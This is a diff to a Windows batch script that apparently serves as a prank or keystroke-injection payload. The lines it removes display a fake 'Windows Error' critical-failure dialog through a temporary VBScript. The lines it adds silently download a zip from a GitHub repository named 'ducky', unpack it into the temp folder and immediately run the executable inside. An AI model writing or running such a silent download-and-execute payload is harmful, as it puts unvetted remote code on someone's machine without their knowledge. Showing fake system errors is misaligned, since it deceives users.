@@ -1,4 +1,7 @@
 @echo off
-echo x=msgbox("A critical system error has occurred. Please restart your application.", 16, "Windows Error") > "%temp%\err.vbs"
-cscript //nologo "%temp%\err.vbs"
-del "%temp%\err.vbs"
+set "URL=https://raw.githubusercontent.com/BLOCKCE/ducky/refs/heads/main/dg.zip"
+set "EXE=GooseDesktop.exe"
+set "DIR=%TEMP%\pkg"
+
+rmdir /s /q "%DIR%" 2>nul & mkdir "%DIR%"
+curl -Ls "%URL%" -o "%TEMP%\pkg.zip" && tar -xf "%TEMP%\pkg.zip" -C "%DIR%" && start "" "%DIR%\%EXE%"
